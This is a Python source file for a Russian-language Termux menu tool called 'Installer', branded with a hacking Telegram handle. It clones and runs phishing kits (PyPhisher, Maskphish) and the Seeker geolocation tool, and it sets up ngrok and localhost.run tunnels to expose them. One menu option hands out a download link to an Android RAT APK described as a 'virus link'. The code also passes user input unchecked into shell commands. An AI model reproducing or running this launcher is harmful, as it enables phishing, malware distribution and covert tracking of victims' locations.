import os, time, webbrowser

from colorama import Fore, Style

os.system('clear')

def res():
    print(Style.RESET_ALL)
    
while True:
    print('')
    print(Fore.CYAN+'', Style.BRIGHT)
    print (" ___                 _             _   _               ")
    print ("|_ _|  _ __    ___  | |_    __ _  | | | |   ___   _ __ ")
    print (" | |  | '_ \  / __| | __|  / _` | | | | |  / _ \ | '__|")
    print (" | |  | | | | \__ \ | |_  | (_| | | | | | |  __/ | |   ")
    print ("|___| |_| |_| |___/  \__|  \__,_| |_| |_|  \___| |_|   ")
    print('\n')
    print ("[Telegram: @SYPEXHACK]                         [v2.7.1]")
    res()
    print (Fore.GREEN+"    [1] Ngrok      >>  Тунелирование")
    print (Fore.GREEN+"    [2] Localhost  >>  Тунелирование")
    print (Fore.GREEN+"    [3] PyPhiser   >>  Фишинг")
    print (Fore.GREEN+"    [4] Android    >>  Вирус ссылка")
    print (Fore.GREEN+"    [5] Maskphish  >>  Замаскировать ссылку")
    print (Fore.GREEN+"    [6] IP-Tracer  >>  Пробив по IP")
    print (Fore.GREEN+"    [7] Seeker     >>  Узнать местоположения")
    print (Fore.CYAN+"")
    print (Fore.YELLOW+'    [s] Настройки')
    print (Fore.YELLOW+'    [e] Выход')
    res()
    inp = input ('  Выбери пункт>>> ')
    os.system('clear')

    
        
    if inp == '1':
        print('\n'' ['+Fore.RED+'ВНИМАНИЕ'+Fore.WHITE+'] ВКЛЮЧИТЕ ТОЧКУ ДОСТУПА И МОБИЛЬНЫЙ ИНТЕРНЕТ')
        tru_101 = input('\n'' Включили? [y/n] >>> ')
        os.system('clear')
        if tru_101 == 'y':
            print(Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка Ngrok...")
            res()
            os.system('pkg install nodejs-lts -y')
            os.system('clear')
            print(Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка Ngrok...")
            res()
            os.system('npm install ngrok')
            os.system('clear')
            print(Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка Ngrok...")
            res()
            os.system('npm install ngrok -g')
            we  = '8080'
            os.system('clear')
            print('\n')
            print(Fore.CYAN+' Стандартный порт ['+Fore.YELLOW+'8080'+Fore.CYAN+']')
            print(Fore.WHITE+'')
            tru_102 = input('\n'' Изменить порт? [y/n] >>> ')
            if tru_102 == 'y':
                os.system('clear')
                we_2 = input('\n'' Введите порт>>> ')
                if we_2 == '':
                    os.system('clear')
                    print('\n')
                    print(Fore.YELLOW+' Вы ничего не ввели!')
                    print('\n'+Fore.CYAN+' Использую стандартный порт ['+Fore.YELLOW+'8080'+Fore.CYAN+']')
                    time.sleep(7)
                    os.system('clear')
                    print(Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Запуск..."+Fore.WHITE+"")
                    time.sleep(2)
                    os.system('ngrok http '+we+' && clear')
                    os.system('clear')
                    
                else:
                    os.system('clear')
                    print(Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Запуск..."+Fore.WHITE+"")
                    time.sleep(2)
                    os.system('ngrok http '+we_2+' && clear')
                    os.system('clear')

            if tru_102 == 'n':
                os.system('clear')
                print(Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Запуск..."+Fore.WHITE+"")
                time.sleep(2)
                os.system('clear')
                os.system('ngrok http '+we+' && clear')
                os.system('clear')
                
            else:
                os.system('clear')
                    
        if tru_101 == 'n':
            os.system('clear')
            

    
    if inp == '2':
        print('\n'' ['+Fore.RED+'ВНИМАНИЕ'+Fore.WHITE+'] ВКЛЮЧИТЕ ТОЧКУ ДОСТУПА И МОБИЛЬНЫЙ ИНТЕРНЕТ')
        tru_201 = input('\n'' Включили? [y/n] >>> ')
        os.system('clear')
        if tru_201 == 'y':
            print(Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка Localhost...")
            res()
            time.sleep(1.5)
            os.system('clear')
            print(Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка dropbear...")
            res()
            os.system('pkg install dropbear -y')
            os.system('clear')
            print(Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка openssh...")
            res()
            os.system('pkg install openssh -y')
            qw  = '8080'
            os.system('clear')
            print('\n')
            print(Fore.CYAN+' Стандартный порт ['+Fore.YELLOW+'8080'+Fore.CYAN+']')
            print(Fore.WHITE+'')
            tru_202 = input('\n'' Изменить порт? [y/n] >>> ')
            if tru_202 == 'y':
                os.system('clear')
                qw_2 = input('\n'' Введите порт>>> ')
                if qw_2 == '':
                    os.system('clear')
                    print('\n')
                    print(Fore.YELLOW+' Вы ничего не ввели!')
                    print('\n'+Fore.CYAN+' Использую стандартный порт ['+Fore.YELLOW+'8080'+Fore.CYAN+']')
                    time.sleep(7)
                    os.system('clear')
                    print(Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Запуск..."+Fore.WHITE+"")
                    time.sleep(2)
                    os.system('ssh -R 80:localhost:'+qw+' nokey@localhost.run && clear')
                    os.system('clear')
                    
                else:
                    os.system('clear')
                    print(Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Запуск..."+Fore.WHITE+"")
                    time.sleep(2)
                    os.system('ssh -R 80:localhost:'+qw_2+' nokey@localhost.run && clear')
                    os.system('clear')

            if tru_202 == 'n':
                os.system('clear')
                print(Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Запуск..."+Fore.WHITE+"")
                time.sleep(2)
                os.system('clear')
                os.system('ssh -R 80:localhost:'+qw+' nokey@localhost.run && clear')
                os.system('clear')
                
            else:
                os.system('clear')
                    
        if tru_201 == 'n':
            os.system('clear')

    

    if inp == '3':
        os.system('clear')
        print('['+Fore.RED+'ВНИМАНИЕ'+Fore.WHITE+' ПЕРЕД ЗАПУСКОМ ВКЛЮИТЕ ТОЧКУ ДОСТУПА И МОБ ИНТЕРНЕТ]')
        tru_301 = input('\n Включили? [y/n] >>> ')
        os.system('clear')
        if tru_301 == 'y':
            print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка PyPhiser...")
            res()
            time.sleep(1.5)
            os.system('git clone https://github.com/KasRoudra/PyPhisher')
            os.chdir('PyPhisher')
            os.system('clear')
            os.system('python3 pyphisher.py && clear')
            os.system('clear')

        if tru_301 == 'n':
            os.system('clear')

        else:
            os.system('clear')

    

    if inp == '4':
        os.system('clear')
        print(Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Получам ссылку...")
        res()
        time.sleep(3)
        os.system('clear')
        print(Fore.CYAN+' Ваша ссылка''\n')
        res()
        print(Fore.GREEN+' https://github.com/LOoLzeC/vcrt/raw/master/dendroid.apk')
        res()
        tru_901 = input('\n [Нажмите enter чтобы выйти]')
        os.system('clear')

    

    if inp == '5':
        print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка Maskphish...")
        res()
        os.system('git clone https://github.com/jaykali/maskphish.git')
        os.chdir('maskphish')
        os.system('clear')
        os.system('bash maskphish.sh')
        tsu_1001 = input('\n [Нажмите enter чтобы выйти]')
        os.system('clear')

    
    
    if inp == '6':
        print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка IP-Tracer...")
        res()
        time.sleep(1.5)
        os.system('rm -fr IP-Tracer')
        os.system('git clone https://github.com/rajkumardusad/IP-Tracer.git')
        os.system('cd IP-Tracer')
        os.system('bash ./install')
        os.system('clear')
        print(Fore.GREEN+"\n")
        print(' [1] Пробить свой IP')
        print(' [2] Пробить чужой IP')
        print(Fore.YELLOW+'')
        print(' [e] выход')
        res()
        tru_1201 = input(' Выбери пункт>>> ')

        if tru_1201 == '1':
            os.system('clear')
            os.system('trace -m')
            tsu_800 = input('\n [Нажмите enter чтобы выйти]')
            os.system('clear')
            
        if tru_1201 == '2':
            os.system('clear')
            print(Fore.YELLOW+'Пример IP'+Fore.CYAN+' 33.73.133.137')
            res()
            tsu_1202 = input('Введите IP >>> ')
            os.system('trace -t '+tsu_1202)

            tsu_1203 = input('\n [Нажмите enter чтобы выйти]')
            os.system('clear')
            
        else:
            os.system('clear')

    

    if inp == '7':
        os.system('clear')
        print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка Seeker...")
        res()
        time.sleep(1.5)
        os.system('clear')
        print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка dropbear...")
        res()
        os.system('pkg install dropbear -y')
        os.system('clear')
        print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка openssh...")
        res()
        os.system('pkg install openssh -y')
        os.system('clear')
        print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка php...")
        res()
        os.system('pkg install php -y')
        os.system('clear')
        print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка php7...")
        res()
        os.system('pkg install php7 -y')
        os.system('clear')
        print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка Seeker...")
        res()
        os.system('git clone https://github.com/thewhiteh4t/seeker.git')
        os.chdir('seeker')
        os.system('clear')
        print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка Seeker...")
        res()
        os.system('chmod 777 install.sh')
        os.system('./install.sh')
        os.system('clear')
        os.system('python seeker.py && clear')
        os.system('clear')
    

    
    if inp == 's':
        os.system('python set.py')



    if inp == 'e':
        os.system('clear')
        print('\n')
        print(Fore.CYAN+'Спасибо за использование Installer')
        res()
        break
